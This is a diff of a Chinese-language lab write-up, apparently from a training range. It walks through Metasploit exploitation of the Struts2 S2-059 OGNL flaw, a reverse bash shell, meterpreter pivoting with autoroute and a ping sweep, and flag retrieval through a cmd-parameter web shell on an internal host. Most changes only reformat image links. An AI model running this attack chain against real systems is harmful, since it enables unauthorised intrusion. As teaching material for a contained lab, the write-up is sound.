@@ -451,7 +451,7 @@ msf6 >
   $ msfconsole
   ```
 
-  <img src="../程若楠/img/msfconsole.png" alt="msfconsole" style="zoom:50%;" />  
+  ![msfconsole](img/msfconsole.png)  
 
   ```bash
   # 确认已连接 pgsql
@@ -460,7 +460,7 @@ msf6 >
   $ workspace -a Cynthia
   ```
 
-  <img src="../程若楠/img/db_workspace.png" alt="db_workspace" style="zoom: 150%;" /> 
+  ![db_workspace](img/db_workspace.png) 
 
 - 首先要收集服务识别与版本等信息，不断搜索并且完善关键词，最后找到我们所需的 **exp**：`exploit/multi/http/struts2_multi_eval_ognl`
 
@@ -474,7 +474,7 @@ msf6 >
   $ search S2-059 type:exploit
   ```
 
-  <img src="../程若楠/img/search_exp.png" alt="search_exp" style="zoom:50%;" /> 
+  ![search_exp](img/search_exp.png) 
 
 
 - 找到我们所需的 exp 后就选择使用，并且选择设置合适的 exp payload
@@ -490,7 +490,7 @@ msf6 >
   $ set payload payload/cmd/unix/reverse_bash
   ```
 
-  <img src="../程若楠/img/use_n_set_exp.png" alt="use_n_set_exp" style="zoom:50%;" /> 
+  ![use_n_set_exp](img/use_n_set_exp.png) 
 
 - 查看并且配置 exp 参数，确保所有 `Required=yes` 参数均正确配置
 
@@ -508,30 +508,30 @@ msf6 >
   $ show options
   ```
 
-  <img src="../程若楠/img/show_options.png" alt="show_options" style="zoom:50%;" />
+  ![show_options](img/show_options.png)
 
-<img src="../程若楠/img/set_exp.png" alt="set_exp" style="zoom:50%;" />
+  ![set_exp](img/set_exp.png)
 
-- 接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。
+接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。
 
-  ```bash
-  # getshell
-  $ exlpoit -j
-  
-  # 如果攻击成功，查看打开的 reverse shell
-  $ sessions -l
-  
-  # 进入会话 1
-  $ sessions -i 1
-  
-  # 无命令行交互提示信息，试一试 Bash 指令
-  $ id
-  # get flag-1
-  $ ls /tmp
-  # flag-{bmh22c0ab9a-dbef-44b3-a55d-3c448528ae0d}
-  
-  # 通过 CTRL-Z 将当前会话放到后台继续执行
-  ```
+```bash
+# getshell
+$ exlpoit -j
+
+# 如果攻击成功，查看打开的 reverse shell
+$ sessions -l
+
+# 进入会话 1
+$ sessions -i 1
+
+# 无命令行交互提示信息，试一试 Bash 指令
+$ id
+# get flag-1
+$ ls /tmp
+# flag-{bmh22c0ab9a-dbef-44b3-a55d-3c448528ae0d}
+
+# 通过 CTRL-Z 将当前会话放到后台继续执行
+```
 
 <img src="img/flag1.png" alt="flag1" style="zoom:50%;" />
 
@@ -586,7 +586,7 @@ msf6 exploit(multi/http/struts2_multi_eval_ognl) >
 
 此时使用2号会话的meterperter就可以直接查看外层主机的网卡信息了，于是便获得了一个新的内网网段`192.171.84.0/24`：
 
-![screenShot](../hoshi/img/2023-07-26-174733.png)
+![2023-07-26-174733](img/2023-07-26-174733.png)
 
 当然最主要的还是需要用meterpreter实现让外层的主机作为中介路由，将下一步内网扫描的包转发过去，此时会用到`post/multi/manage/autoroute`模块，只需要将会话ID填入即可，之后运行便会自动添加路由信息到Metasploit的路由表中
 
@@ -639,7 +639,7 @@ msf6 post(multi/gather/ping_sweep) >
 $ sessions -c "ls /tmp" -i 6,7,8
 ```
 
-<img src="img/flag2-4.png" alt="flag2-4" style="zoom:50%;" />
+![flag2-4](img/flag2-4.png)
 
 #### 内层网络渗透
 
@@ -701,7 +701,7 @@ $ sessions -u 8
 $ sessions -i 10
 ```
 
-<img src="img/session10.png" alt="session10" style="zoom:50%;" />
+![session10](img/session10.png)
 
 我们可以直接在 meterpreter shell 中直接访问 IP 地址来进行枚举测试
 
@@ -714,7 +714,7 @@ $ wget http://192.172.85.2
 $ wget http://192.172.85.2 -O /tmp/result && cat /tmp/result
 ```
 
-<img src="../程若楠/img/flag_hint.png" alt="flag_hint" style="zoom: 150%;" />
+![flag_hint](img/flag_hint.png)
 
 得到输出结果，并且提示我们需要通过 `index.php?cmd=ls /tmp` 的方式执行，最后成功得到 `flag5`
 
@@ -724,11 +724,11 @@ $ wget 'http://192.172.85.2/index.php?cmd=ls /tmp' -O /tmp/result && cat /tmp/re
 # index.php?cmd=ls /tmpflag-{bmh6b110165-c5c5-4cc0-9079-f6d3305738c63}
 ```
 
-<img src="img/flag5.png" alt="flag5" style="zoom: 150%;" />
+![flag5](img/flag5.png)
 
-至此，整个DMZ主机环境就算是从外层到中层再到内层都拿下了：
+至此，整个DMZ主机环境的Flag从外层到中层再到内层均已攻破：
 
-<img src="img/completed.png" alt="completed" style="zoom:50%;" />
+![completed](img/completed.png)
 
 ### 4 智能化漏洞威胁监测、漏洞攻击和缓解修复
 
